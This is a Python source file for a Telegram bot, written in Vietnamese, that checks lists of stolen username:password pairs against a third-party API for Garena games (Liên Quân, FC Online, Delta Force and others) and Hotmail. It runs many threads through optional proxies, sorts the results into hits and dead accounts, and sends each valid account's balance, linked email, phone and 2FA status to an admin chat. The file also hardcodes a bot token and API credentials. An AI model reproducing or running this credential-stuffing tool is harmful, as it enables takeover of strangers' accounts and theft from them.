# bot.py - Garena Checker Bot - Sửa lỗi Telegram API
import subprocess
import sys
import importlib

# ========== TỰ ĐỘNG CÀI PACKAGES ==========
def install_package(package_name):
    try:
        importlib.import_module(package_name)
    except ImportError:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package_name, "--no-cache-dir"])
        except:
            pass

for pkg in ["requests", "colorama", "pyTelegramBotAPI"]:
    install_package(pkg)

import requests
import threading
import queue
import time
import json
import os
import sys
import re
import telebot
from datetime import datetime
from colorama import init, Fore, Style

init(autoreset=True)

# ========== CẤU HÌNH ==========
# TOKEN PHẢI ĐÚNG ĐỊNH DẠNG: 123456789:ABC-DEF...
TELEGRAM_BOT_TOKEN = "6367532329:AAFXK16_AaÂvANEcrqpOhb1ỉ6vOadxJ6k4U"
ADMIN_CHAT_ID = "5736655322"

# ========== KIỂM TRA TOKEN ==========
def validate_token(token):
    """Kiểm tra token hợp lệ"""
    if not token or ":" not in token:
        return False
    parts = token.split(":")
    if len(parts) != 2:
        return False
    try:
        int(parts[0])
    except ValueError:
        return False
    return len(parts[1]) > 30

# Nếu token không hợp lệ, thử bỏ ký tự đặc biệt
if not validate_token(TELEGRAM_BOT_TOKEN):
    print("[!] Token không hợp lệ, đang thử làm sạch...")
    # Loại bỏ ký tự đặc biệt
    cleaned_token = re.sub(r'[^\w:.-]', '', TELEGRAM_BOT_TOKEN)
    if validate_token(cleaned_token):
        TELEGRAM_BOT_TOKEN = cleaned_token
        print(f"[+] Token đã làm sạch: {TELEGRAM_BOT_TOKEN[:10]}...")
    else:
        print("[!] Token vẫn không hợp lệ!")

API_BASE = "https://lol.nhatminh301.com"
API_USERNAME = "thaituduc"
API_PASSWORD = "thaituduc"

DEFAULT_SERVICE = "lienquan"
DEFAULT_THREADS = 50
DEFAULT_TIMEOUT = 60
DEFAULT_RETRIES = 3
DEFAULT_DELAY = 0.05

INPUT_FILE = "accounts.txt"
OUTPUT_FILE = "hits.txt"
DEAD_FILE = "dead.txt"
UNKNOWN_FILE = "unknown.txt"
FILTERED_FILE = "filtered_accounts.txt"

CUSTOM_PROXY = ""
HOTMAIL_KEYWORD = ""

SERVICE_ROUTES = {
    "lienquan":   {"route": "/api/lienquan",   "desc": "Check Liên Quân + FC Online"},
    "miniworld":  {"route": "/api/miniworld",  "desc": "Check Mini World"},
    "blockmango": {"route": "/api/blockmango", "desc": "Check Blockman Go"},
    "deltaforce": {"route": "/api/deltaforce", "desc": "Check Delta Force (Garena SSO)"},
    "hotmail":    {"route": "/api/hotmail",    "desc": "Check Hotmail + Tìm email"},
    "fc":         {"route": "/api/fc",         "desc": "Check FC Online riêng"},
    "fullpack":   {"route": "/api/fullpack",   "desc": "Check tất cả service qua Garena"}
}

account_queue = queue.Queue()
file_lock = threading.Lock()
stats_lock = threading.Lock()
stop_event = threading.Event()
checking = False

stats = {
    "total": 0,
    "checked": 0,
    "hits": 0,
    "dead": 0,
    "unknown": 0,
    "errors": 0,
    "start_time": None
}

# ========== KHỞI TẠO BOT ==========
try:
    bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, parse_mode="HTML")
    print(f"[+] Bot khởi tạo thành công với token: {TELEGRAM_BOT_TOKEN[:10]}...")
except Exception as e:
    print(f"[!] Lỗi khởi tạo bot: {e}")
    sys.exit(1)

def print_info(msg):
    print(f"[*] {msg}")

def print_success(msg):
    print(f"[+] {msg}")

def print_error(msg):
    print(f"[!] {msg}")

def is_admin(chat_id):
    return str(chat_id) == str(ADMIN_CHAT_ID)

# ========== FORMAT HIT ==========
def format_garena_hit(username, password, data):
    if not isinstance(data, dict):
        return f"━━━━━━━━━ ✅ HIT ━━━━━━━━━\n🔑 {username}:{password}\n📋 {str(data)[:500]}\n━━━━━━━━━━━━━━━━━━━━━━━━━"
    
    uid = data.get("uid", data.get("UID", "N/A"))
    nickname = data.get("nickname", data.get("nick", data.get("name", "N/A")))
    region = data.get("region", data.get("country", "VN"))
    so = data.get("so", data.get("sò", data.get("balance", "0")))
    nap_so = data.get("nap_so", data.get("last_recharge", "N/A"))
    email = data.get("email", "No")
    email_verified = data.get("email_verified", data.get("verify_email", "No"))
    sdt = data.get("sdt", data.get("phone", "No"))
    pass_status = data.get("pass_status", data.get("has_pass", "Yes"))
    fb = data.get("fb", data.get("facebook", "No"))
    band = data.get("band", data.get("banned", "No"))
    login_cuoi = data.get("last_login", data.get("login_cuoi", "N/A"))
    tao_gr = data.get("created", data.get("tao_gr", "N/A"))
    name = data.get("name", data.get("full_name", nickname))
    rank = data.get("rank", data.get("rank_name", "N/A"))
    level = data.get("level", data.get("lv", "N/A"))
    skin = data.get("skin", data.get("skins", "0"))
    hero = data.get("hero", data.get("heroes", "0"))
    qh = data.get("qh", data.get("quan_he", "0"))
    cccd = data.get("cccd", data.get("cmnd", "No"))
    authen = data.get("authen", data.get("2fa", "No"))
    
    tinh_trang = "Acc Thường"
    if fb != "No" and fb != "NO" and fb != "":
        tinh_trang = "Acc Có FB"
    elif email_verified != "No" and email_verified != "NO":
        tinh_trang = "Acc Có Email"
    
    return f"""
━━━━━━━━━ ✅ <b>HIT</b> ━━━━━━━━━
🔑 <code>{username}:{password}</code>
👤 UID: <code>{uid}</code>
👤 Nickname: <code>{nickname}</code>
🌐 Region: <code>{region}</code>
💲 Sò: <code>{so}</code>
💰 Nạp sò: <code>{nap_so}</code>
📩 EMAIL: <code>{email_verified}</code> [{email}]
📱 SĐT: <code>{sdt}</code>
🛡 PASS: <code>{pass_status}</code>
🔗 FB: <code>{fb}</code>
🚫 BAND: <code>{band}</code>
⏰ Login cuối: <code>{login_cuoi}</code>
📅 Tạo GR: <code>{tao_gr}</code>
🔥 NAME: <code>{name}</code>
👑 RANK: <code>{rank}</code>
✨ LEVEL: <code>{level}</code>
💎 SKIN: <code>{skin}</code>
💪 HERO: <code>{hero}</code>
⚡️ QH: <code>{qh}</code>
📄 CCCD: <code>{cccd}</code>
🛡 Authen: <code>{authen}</code>
📋 Tình Trạng: <code>{tinh_trang}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━
"""

# ========== LỌC TÀI KHOẢN ==========
def filter_accounts_txt(content):
    accounts = []
    seen = set()
    
    lines = content.split('\n')
    
    for line in lines:
        line = line.strip()
        
        if not line:
            continue
        
        if line.startswith('#') or line.startswith('//') or line.startswith('--'):
            continue
        
        user = None
        pwd = None
        
        if ':' in line:
            parts = line.split(':', 1)
            user = parts[0].strip()
            pwd = parts[1].strip()
        elif '|' in line:
            parts = line.split('|', 1)
            user = parts[0].strip()
            pwd = parts[1].strip()
        elif '/' in line and not line.startswith('http'):
            parts = line.split('/', 1)
            user = parts[0].strip()
            pwd = parts[1].strip()
        elif ';' in line:
            parts = line.split(';', 1)
            user = parts[0].strip()
            pwd = parts[1].strip()
        elif ',' in line:
            parts = line.split(',', 1)
            user = parts[0].strip()
            pwd = parts[1].strip()
        elif '\t' in line:
            parts = line.split('\t', 1)
            user = parts[0].strip()
            pwd = parts[1].strip()
        elif ' ' in line and len(line.split()) == 2:
            parts = line.split(' ', 1)
            user = parts[0].strip()
            pwd = parts[1].strip()
        
        if user and pwd:
            user = re.sub(r'[^\w.@-]', '', user)
            pwd = pwd.strip()
            
            if len(user) > 0 and len(pwd) > 0:
                key = f"{user}:{pwd}"
                if key not in seen:
                    seen.add(key)
                    accounts.append((user, pwd))
    
    return accounts

def filter_accounts_from_file(filepath):
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        return filter_accounts_txt(content)
    except FileNotFoundError:
        return []
    except Exception as e:
        print_error(f"Lỗi đọc file: {e}")
        return []

def save_filtered_accounts(accounts, filepath=FILTERED_FILE):
    with open(filepath, 'w', encoding='utf-8') as f:
        for user, pwd in accounts:
            f.write(f"{user}:{pwd}\n")
    return len(accounts)

# ========== GỌI API ==========
def check_account_api(username, password, service, proxy="", keyword=""):
    route = SERVICE_ROUTES[service]["route"]
    url = f"{API_BASE}{route}"
    
    params = {
        "username": API_USERNAME,
        "password": API_PASSWORD,
        "tk": username,
        "mk": password
    }
    
    if proxy:
        params["proxy"] = proxy
    
    if service == "hotmail" and keyword:
        params["keyword"] = keyword
    
    session = requests.Session()
    
    for attempt in range(DEFAULT_RETRIES):
        try:
            resp = session.get(url, params=params, timeout=DEFAULT_TIMEOUT)
            
            if resp.status_code == 200:
                try:
                    return resp.json()
                except json.JSONDecodeError:
                    return {"raw": resp.text, "status": "unknown"}
            elif resp.status_code == 429:
                time.sleep(3)
            else:
                time.sleep(1)
                
        except requests.exceptions.Timeout:
            time.sleep(2)
        except requests.exceptions.ConnectionError:
            time.sleep(3)
        except requests.exceptions.RequestException:
            time.sleep(1)
    
    return {"status": "error", "message": "Request failed after retries"}

# ========== PHÂN TÍCH KẾT QUẢ ==========
def parse_result(result):
    if not isinstance(result, dict):
        return "unknown", str(result)
    
    status = str(result.get("status", "")).lower()
    success = result.get("success", False)
    message = str(result.get("message", ""))
    data = result.get("data", None)
    
    if "status" in result and isinstance(result["status"], bool):
        if result["status"]:
            return "hit", data if data else json.dumps(result, ensure_ascii=False)
        else:
            return "dead", message
    
    hit_keywords = ["success", "valid", "hit", "live", "ok", "true", "đúng", "hợp lệ"]
    dead_keywords = ["fail", "invalid", "dead", "die", "sai", "không đúng", "error", "expired"]
    
    status_lower = status.lower()
    message_lower = message.lower()
    
    for kw in hit_keywords:
        if kw in status_lower or kw in message_lower:
            return "hit", data if data else json.dumps(result, ensure_ascii=False)
    
    for kw in dead_keywords:
        if kw in status_lower or kw in message_lower:
            return "dead", message if message else json.dumps(result, ensure_ascii=False)
    
    if data:
        return "hit", data
    
    return "unknown", json.dumps(result, ensure_ascii=False)

# ========== LƯU KẾT QUẢ ==========
def save_hit_txt(username, password, detail):
    detail_str = json.dumps(detail, ensure_ascii=False) if isinstance(detail, dict) else str(detail)
    with file_lock:
        with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
            f.write(f"{username}:{password} | {detail_str}\n")

def save_dead_txt(username, password):
    with file_lock:
        with open(DEAD_FILE, 'a', encoding='utf-8') as f:
            f.write(f"{username}:{password}\n")

def save_unknown_txt(username, password, detail):
    detail_str = json.dumps(detail, ensure_ascii=False) if isinstance(detail, dict) else str(detail)
    with file_lock:
        with open(UNKNOWN_FILE, 'a', encoding='utf-8') as f:
            f.write(f"{username}:{password} | {detail_str}\n")

# ========== WORKER ==========
def worker(service, proxy, keyword):
    while not stop_event.is_set():
        try:
            username, password = account_queue.get_nowait()
        except queue.Empty:
            break
        
        result = check_account_api(username, password, service, proxy, keyword)
        category, detail = parse_result(result)
        
        if category == "hit":
            save_hit_txt(username, password, detail)
        elif category == "dead":
            save_dead_txt(username, password)
        else:
            save_unknown_txt(username, password, detail)
        
        with stats_lock:
            stats["checked"] += 1
            if category == "hit":
                stats["hits"] += 1
                hit_msg = format_garena_hit(username, password, detail)
                try:
                    bot.send_message(ADMIN_CHAT_ID, hit_msg)
                except:
                    pass
            elif category == "dead":
                stats["dead"] += 1
            else:
                stats["unknown"] += 1
        
        account_queue.task_done()
        time.sleep(DEFAULT_DELAY)

# ========== BẮT ĐẦU CHECK ==========
def start_check(chat_id, service, threads, proxy="", keyword=""):
    global checking, stats
    
    if checking:
        bot.send_message(chat_id, "⚠️ <b>Đang check rồi!</b>")
        return
    
    stats = {
        "total": 0,
        "checked": 0,
        "hits": 0,
        "dead": 0,
        "unknown": 0,
        "errors": 0,
        "start_time": time.time()
    }
    
    checking = True
    stop_event.clear()
    
    accounts = filter_accounts_from_file(INPUT_FILE)
    stats["total"] = len(accounts)
    
    if not accounts:
        bot.send_message(chat_id, "❌ <b>Không có tài khoản hợp lệ!</b>")
        checking = False
        return
    
    save_filtered_accounts(accounts)
    
    start_msg = f"""
🚀 <b>BẮT ĐẦU CHECK GARENA</b>
📋 Service: <code>{service}</code>
📁 Tổng: <code>{len(accounts)}</code>
⚡ Threads: <code>{threads}</code>
"""
    bot.send_message(chat_id, start_msg)
    
    for acc in accounts:
        account_queue.put(acc)
    
    threads_list = []
    num_threads = min(threads, len(accounts))
    
    for i in range(num_threads):
        t = threading.Thread(target=worker, args=(service, proxy, keyword))
        t.start()
        threads_list.append(t)
    
    for t in threads_list:
        t.join()
    
    elapsed = time.time() - stats["start_time"]
    checking = False
    
    result_msg = f"""
✅ <b>CHECK HOÀN THÀNH</b>
📊 Tổng: <code>{stats['total']}</code>
🔴 Hits: <code>{stats['hits']}</code>
❌ Dead: <code>{stats['dead']}</code>
⏱ Thời gian: <code>{elapsed:.2f}s</code>
"""
    bot.send_message(chat_id, result_msg)
    
    if stats["hits"] > 0:
        try:
            with open(OUTPUT_FILE, 'rb') as f:
                bot.send_document(chat_id, f, caption="📁 hits.txt")
        except:
            pass
    
    if stats["dead"] > 0:
        try:
            with open(DEAD_FILE, 'rb') as f:
                bot.send_document(chat_id, f, caption="📁 dead.txt")
        except:
            pass

# ========== COMMANDS ==========
@bot.message_handler(commands=['start'])
def cmd_start(message):
    if not is_admin(message.chat.id):
        return
    help_text = """
🤖 <b>GARENA CHECKER BOT</b>

✅ <b>API:</b> <code>thaituduc</code>
✅ <b>GIỚI HẠN:</b> <code>KHÔNG CÓ</code>

📌 <b>LỆNH:</b>

/check1 &lt;service&gt; &lt;user&gt; &lt;pass&gt; - Check 1 tk
/check &lt;service&gt; &lt;threads&gt; - Check danh sách
/checkall &lt;threads&gt; - Check fullpack
/filter - Lọc tài khoản txt
/list - Xem danh sách đã lọc
/hits - Tải file hits.txt
/dead - Tải file dead.txt
/stop - Dừng check
/status - Trạng thái
/services - Danh sách services
/setproxy &lt;ip:port&gt; - Cài proxy
/setkeyword &lt;từ_khóa&gt; - Keyword hotmail

📋 <b>SERVICES:</b>
lienquan, miniworld, blockmango, deltaforce, hotmail, fc, fullpack

📁 <b>GỬI FILE:</b>
Gửi file .txt chứa user:pass
"""
    bot.send_message(message.chat.id, help_text)

@bot.message_handler(commands=['check1'])
def cmd_check1(message):
    if not is_admin(message.chat.id):
        return
    
    parts = message.text.split()
    if len(parts) < 4:
        bot.reply_to(message, "❌ Dùng: /check1 &lt;service&gt; &lt;user&gt; &lt;pass&gt;")
        return
    
    service = parts[1]
    username = parts[2]
    password = parts[3]
    
    if service not in SERVICE_ROUTES:
        bot.reply_to(message, "❌ Service không hợp lệ!")
        return
    
    bot.reply_to(message, f"🔍 Đang check {username}...")
    
    def do_check():
        result = check_account_api(username, password, service, CUSTOM_PROXY, HOTMAIL_KEYWORD)
        category, detail = parse_result(result)
        
        if category == "hit":
            hit_msg = format_garena_hit(username, password, detail)
            save_hit_txt(username, password, detail)
        elif category == "dead":
            hit_msg = f"❌ DEAD: {username}:{password}"
            save_dead_txt(username, password)
        else:
            hit_msg = f"⚠️ UNKNOWN: {username}:{password}"
            save_unknown_txt(username, password, detail)
        
        bot.send_message(message.chat.id, hit_msg)
    
    threading.Thread(target=do_check).start()

@bot.message_handler(commands=['check'])
def cmd_check(message):
    if not is_admin(message.chat.id):
        return
    
    if checking:
        bot.reply_to(message, "⚠️ Đang check rồi!")
        return
    
    parts = message.text.split()
    service = DEFAULT_SERVICE
    threads = DEFAULT_THREADS
    
    if len(parts) >= 2 and parts[1] in SERVICE_ROUTES:
        service = parts[1]
    
    if len(parts) >= 3:
        try:
            threads = int(parts[2])
        except ValueError:
            bot.reply_to(message, "❌ Threads phải là số!")
            return
    
    bot.reply_to(message, f"🚀 Bắt đầu check {service}...")
    threading.Thread(target=start_check, args=(message.chat.id, service, threads, CUSTOM_PROXY, HOTMAIL_KEYWORD)).start()

@bot.message_handler(commands=['checkall'])
def cmd_checkall(message):
    if not is_admin(message.chat.id):
        return
    
    if checking:
        bot.reply_to(message, "⚠️ Đang check rồi!")
        return
    
    parts = message.text.split()
    threads = DEFAULT_THREADS
    
    if len(parts) >= 2:
        try:
            threads = int(parts[1])
        except ValueError:
            bot.reply_to(message, "❌ Threads phải là số!")
            return
    
    bot.reply_to(message, "🚀 Bắt đầu check fullpack...")
    threading.Thread(target=start_check, args=(message.chat.id, "fullpack", threads, CUSTOM_PROXY, HOTMAIL_KEYWORD)).start()

@bot.message_handler(commands=['filter'])
def cmd_filter(message):
    if not is_admin(message.chat.id):
        return
    
    bot.reply_to(message, "🔧 Đang lọc...")
    
    def do_filter():
        accounts = filter_accounts_from_file(INPUT_FILE)
        
        if not accounts:
            bot.send_message(message.chat.id, "❌ Không có tài khoản hợp lệ!")
            return
        
        count = save_filtered_accounts(accounts)
        bot.send_message(message.chat.id, f"✅ Đã lọc {count} tài khoản!")
        
        with open(FILTERED_FILE, 'rb') as f:
            bot.send_document(message.chat.id, f, caption="📁 filtered_accounts.txt")
    
    threading.Thread(target=do_filter).start()

@bot.message_handler(commands=['list'])
def cmd_list(message):
    if not is_admin(message.chat.id):
        return
    
    try:
        with open(FILTERED_FILE, 'r', encoding='utf-8') as f:
            content = f.read()
        
        if content:
            with open(FILTERED_FILE, 'rb') as f:
                bot.send_document(message.chat.id, f, caption="📁 filtered_accounts.txt")
        else:
            bot.reply_to(message, "❌ Chưa có file!")
    except FileNotFoundError:
        bot.reply_to(message, "❌ Chưa có file!")

@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    if not is_admin(message.chat.id):
        return
    stop_event.set()
    global checking
    checking = False
    bot.reply_to(message, "🛑 Đã dừng!")

@bot.message_handler(commands=['status'])
def cmd_status(message):
    if not is_admin(message.chat.id):
        return
    
    if not checking:
        bot.reply_to(message, "💤 Bot đang rảnh")
        return
    
    elapsed = time.time() - stats["start_time"] if stats["start_time"] else 0
    msg = f"""
📊 Trạng thái:
✅ Đã check: {stats['checked']}/{stats['total']}
🔴 Hits: {stats['hits']}
❌ Dead: {stats['dead']}
⚡ Tốc độ: {stats['checked']/elapsed:.2f} acc/s
"""
    bot.send_message(message.chat.id, msg)

@bot.message_handler(commands=['hits'])
def cmd_hits(message):
    if not is_admin(message.chat.id):
        return
    try:
        with open(OUTPUT_FILE, 'rb') as f:
            bot.send_document(message.chat.id, f, caption="📁 hits.txt")
    except FileNotFoundError:
        bot.reply_to(message, "❌ Chưa có hits!")

@bot.message_handler(commands=['dead'])
def cmd_dead(message):
    if not is_admin(message.chat.id):
        return
    try:
        with open(DEAD_FILE, 'rb') as f:
            bot.send_document(message.chat.id, f, caption="📁 dead.txt")
    except FileNotFoundError:
        bot.reply_to(message, "❌ Chưa có dead!")

@bot.message_handler(commands=['services'])
def cmd_services(message):
    if not is_admin(message.chat.id):
        return
    services_text = "📋 Services:\n\n"
    for key, val in SERVICE_ROUTES.items():
        services_text += f"• {key} - {val['desc']}\n"
    bot.send_message(message.chat.id, services_text)

@bot.message_handler(commands=['setproxy'])
def cmd_setproxy(message):
    if not is_admin(message.chat.id):
        return
    global CUSTOM_PROXY
    
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        CUSTOM_PROXY = ""
        bot.reply_to(message, "✅ Đã xóa proxy!")
        return
    
    CUSTOM_PROXY = parts[1].strip()
    bot.reply_to(message, f"✅ Đã cài proxy: {CUSTOM_PROXY}")

@bot.message_handler(commands=['setkeyword'])
def cmd_setkeyword(message):
    if not is_admin(message.chat.id):
        return
    global HOTMAIL_KEYWORD
    
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        HOTMAIL_KEYWORD = ""
        bot.reply_to(message, "✅ Đã xóa keyword!")
        return
    
    HOTMAIL_KEYWORD = parts[1].strip()
    bot.reply_to(message, f"✅ Đã cài keyword: {HOTMAIL_KEYWORD}")

@bot.message_handler(content_types=['document'])
def handle_document(message):
    if not is_admin(message.chat.id):
        return
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        with open(INPUT_FILE, 'wb') as f:
            f.write(downloaded_file)
        
        content = downloaded_file.decode('utf-8', errors='ignore')
        accounts = filter_accounts_txt(content)
        
        if not accounts:
            bot.reply_to(message, "❌ Không có tài khoản hợp lệ!")
            return
        
        count = save_filtered_accounts(accounts)
        bot.reply_to(message, f"✅ Đã lọc {count} tài khoản!")
        
        with open(FILTERED_FILE, 'rb') as f:
            bot.send_document(message.chat.id, f, caption="📁 filtered_accounts.txt")
    
    except Exception as e:
        bot.reply_to(message, f"❌ Lỗi: {e}")

@bot.message_handler(content_types=['text'])
def handle_text(message):
    if not is_admin(message.chat.id):
        return
    
    if message.text.startswith('/'):
        return
    
    accounts = filter_accounts_txt(message.text)
    
    if not accounts:
        return
    
    with open(INPUT_FILE, 'a', encoding='utf-8') as f:
        for user, pwd in accounts:
            f.write(f"{user}:{pwd}\n")
    
    all_accounts = filter_accounts_from_file(INPUT_FILE)
    count = save_filtered_accounts(all_accounts)
    
    bot.reply_to(message, f"✅ Đã lọc {len(accounts)} tk, tổng: {count}")

# ========== MAIN ==========
def main():
    print("=" * 60)
    print("    GARENA CHECKER BOT")
    print("=" * 60)
    
    # KHÔNG dùng remove_webhook() - bỏ qua lỗi 404
    # Thử gửi tin nhắn khởi động
    try:
        bot.send_message(ADMIN_CHAT_ID, "🤖 Bot đã khởi động!\nDùng /start để xem menu")
    except Exception as e:
        print(f"[!] Không gửi được tin nhắn: {e}")
    
    print("[*] Bot đang chạy...")
    
    while True:
        try:
            bot.polling(none_stop=True, interval=1, timeout=30)
        except Exception as e:
            print(f"[!] Lỗi polling: {e}")
            time.sleep(5)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Bot đã dừng!")
        sys.exit(0)
